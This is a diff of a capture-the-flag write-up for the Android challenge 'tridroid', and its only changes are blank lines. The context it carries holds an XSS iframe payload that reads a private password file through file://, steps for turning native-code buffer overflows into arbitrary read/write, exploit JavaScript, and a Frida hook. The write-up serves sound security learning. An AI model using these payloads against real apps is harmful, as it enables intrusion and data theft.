@@ -100,6 +100,7 @@ Upon seeing that we could directly see that we can get XSS from it, but where to
         }
     }
 ```
+
 We can use  `bridge.manageStack` but we need password to use it. Every time app launched, it will also drop a random UUID to password.txt located at `/data/data/com.google.ctf.tridroid/files/password.txt`. 
 ```java
 	public void onCreate(Bundle bundle) {
@@ -130,21 +131,28 @@ We can use  `bridge.manageStack` but we need password to use it. Every time app 
         }
     }
 ```
+
 This is where our XSS can come in handy to read the password. Here's our initial payload, we can use `file://` scheme because it's explicitly allowed when setting up the webview,
 ```html
 <iframe name=x src=file:///data/data/com.google.ctf.pwn.tridroid/files/password.txt onload='var password=top.x.document.body.innerHTML.match(/\b[0-9a-f]{8}\b-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-\b[0-9a-f]{12}\b/)[0];'></iframe>
 ```
 Use iframe to load password file and the content of the password is available through `top.x.document.body`. Of course, getting the password is just one of the very first few of steps. If we take a look back at manageStack again, it calls a native function with the second param converted to byteArray first from a hex string.
+
 ```java
 public native byte[] manageStack(String str, byte[] bArr);
 ...
 		String hex = hex(manageStack(str2, unhex(str3)));
 ```
 This is Binary Ninja decompilation output of the native function
+
 ![binja decompile](https://files.catbox.moe/kh6f75.png)
+
 We have 4 mode to operate with the stack, `push DATA`, `pop`, `top`, and `modify DATA`. We also spotted some easy buffer overflow bug in almost every of those operations function because of no bound check when data copied from byte array to target buffer.
+
 ![push_element](https://files.catbox.moe/8q21ok.png)
+
 ![modifypush_element](https://files.catbox.moe/0wkxzx.png)
+
 We have our data size 16 bytes and the next stack top pointer is placed next to it. We can turn this into arbitrary read/write easily with this step,
 
 1. Use `modify` to edit stack top data to overwrite next top pointer to target address,
@@ -153,7 +161,9 @@ We have our data size 16 bytes and the next stack top pointer is placed next to 
 4. `push` something again to restore our stack
 
 Or visualized,
+
 ![visual](https://files.catbox.moe/vlo9xe.jpg)
+
 Here's the updated piece of our code that will run inside our `onload` event from iframe.
 ```js
 function stack_push(s) {
@@ -274,7 +284,9 @@ adb_logs()
 emulator.kill()
 ```
 So, in summary we need to call java showFlag method in MainActivity to get the flag. Luckily, we have invokeJavaMethod helper function in libtridroid.
+
 ![invokeJavaMethod](https://files.catbox.moe/kxzzu9.png)
+
 We still need to get jnienv and jobject pointers. This is where frida our arb r/w can come in handy. First, we can add a hook to `Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack__Ljava_lang_String_2_3B` and log jnienv and jobj ptr.
 ```js
 Interceptor.attach(Module.getExportByName('libtridroid.so', 'Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack__Ljava_lang_String_2_3B'), {
